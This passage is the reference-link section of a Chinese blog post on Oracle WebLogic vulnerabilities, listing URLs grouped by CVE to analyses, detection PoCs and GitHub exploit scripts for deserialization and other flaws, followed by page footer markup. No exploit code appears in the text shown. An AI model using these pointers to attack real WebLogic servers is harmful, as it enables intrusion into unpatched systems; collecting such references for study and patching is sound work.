http<span></span>s://github.com/rabbitmask/WeblogicR<br>检测poc：<br>htt<span></span>ps://wsygoogol.github.io/2016/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/<br>htt<span></span>ps://ww<span></span>w.4hou.com/vulnerable/12874.html<br>CVE-2016-0638:<br>h<span></span>ttps://www<span></span>.colabug.com/217461.html<br>ht<span></span>tp://w<span></span>ww.mamicode.com/info-detail-2579160.html<br>ht<span></span>tps://ww<span></span>w.butian.net/School/content/id/286<br>总结版本weblogic： ht<span></span>tps://xz.aliyun.com/t/2041#toc-0<br>CVE-2017-3248:<br>htt<span></span>ps://paper.seebug.org/333/<br>ht<span></span>tps://w<span></span>ww.colabug.com/217461.html<br>CVE-2015-4852:<br>含反序列化漏洞分析：<br>http<span></span>s://5alt.me/2018/04/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/<br>CVE-2018-3245(exp）：<br>参考命令：<br>htt<span></span>ps://github.com/followboy1999/weblogic-deserialization/tree/master/exploit<br>运行脚本：<br>http<span></span>s://github.com/pyn3rd/CVE-2018-3245<br>CVE-2018-3252(POC)需要知道用户名，密码：没什么太多用处：<br>htt<span></span>ps://github.com/pyn3rd/CVE-2018-3252<br>分析<br>htt<span></span>ps://blogs.projectmoon.pw/2018/10/19/Oracle-WebLogic-Two-RCE-Deserialization-Vulnerabilities/<br>CVE-2018-3191(exp）：<br>htt<span></span>ps://github.com/jas502n/CVE-2018-3191<br>htt<span></span>ps://github.com/followboy1999/weblogic-deserialization/tree/master/exploit/CVE-2018-3191<br>CVE-2019-2647:<br>htt<span></span>ps://paper.seebug.org/906/<br>htt<span></span>ps://blog.csdn.net/he_and/article/details/89843004<br>htt<span></span>ps://blog.51cto.com/14126565/2388415?source=dra<br>CVE-2019-2725:<br>htt<span></span>ps://github.com/SkyBlueEternal/CNVD-C-2019-48814-CNNVD-201904-961<br>CVE-2017-10271:<br>htt<span></span>ps://github.com/c0mmand3rOpSec/CVE-2017-10271</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Inici</a></li>
         
          <li><a href="/archives/">archives</a></li>
         
          <li><a href="https://github.com/echo001">Projectes</a></li>
         
          <li><a href="/about/">Qui som</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01、目的"><span class="toc-number">1.</span> <span class="toc-text">0x01、目的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02、简述"><span class="toc-number">2.</span> <span class="toc-text">0x02、简述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-反序列化漏洞"><span class="toc-number">2.1.</span> <span class="toc-text">1.反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-任意文件上传漏洞"><span class="toc-number">2.2.</span> <span class="toc-text">2.任意文件上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Weblogic-SSRF漏洞"><span class="toc-number">2.3.</span> <span class="toc-text">3.Weblogic SSRF漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03、测试复现"><span class="toc-number">3.</span> <span class="toc-text">0x03、测试复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-反序列化漏洞-1"><span class="toc-number">3.1.</span> <span class="toc-text">1.反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-CVE-2015-4852"><span class="toc-number">3.1.1.</span> <span class="toc-text">1.1 CVE-2015-4852</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-CVE-2016-0638-CVE-2016-3510-CVE-2017-3248-CVE-2018-2893"><span class="toc-number">3.1.2.</span> <span class="toc-text">1.2 CVE-2016-0638/CVE-2016-3510/CVE-2017-3248/CVE-2018-2893</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-CVE-2018-2628-EXP"><span class="toc-number">3.1.3.</span> <span class="toc-text">1.3 CVE-2018-2628(EXP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-CVE-2018-3245-EXP"><span class="toc-number">3.1.4.</span> <span class="toc-text">1.4 CVE-2018-3245(EXP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-CVE-2018-3191-EXP"><span class="toc-number">3.1.5.</span> <span class="toc-text">1.5 CVE-2018-3191(EXP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6-CVE-2017-10271"><span class="toc-number">3.1.6.</span> <span class="toc-text">1.6 CVE-2017-10271</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7-CVE-2019-2725"><span class="toc-number">3.1.7.</span> <span class="toc-text">1.7 CVE-2019-2725</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-任意文件上传漏洞（CVE-2018-2894"><span class="toc-number">3.2.</span> <span class="toc-text">2.任意文件上传漏洞（CVE-2018-2894)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Weblogic-SSRF"><span class="toc-number">3.3.</span> <span class="toc-text">3.Weblogic SSRF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04、总结"><span class="toc-number">4.</span> <span class="toc-text">0x04、总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05、参考网址"><span class="toc-number">5.</span> <span class="toc-text">0x05、参考网址</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/Foundation/weblogic-vulnerability-basis/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&text=Weblogic漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&title=Weblogic漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&is_video=false&description=Weblogic漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Weblogic漏洞&body=Check out this article: http://yoursite.com/Foundation/weblogic-vulnerability-basis/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&title=Weblogic漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&title=Weblogic漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&title=Weblogic漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&title=Weblogic漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&name=Weblogic漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Inici</a></li>
         
          <li><a href="/archives/">archives</a></li>
         
          <li><a href="https://github.com/echo001">Projectes</a></li>
         
          <li><a href="/about/">Qui som</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
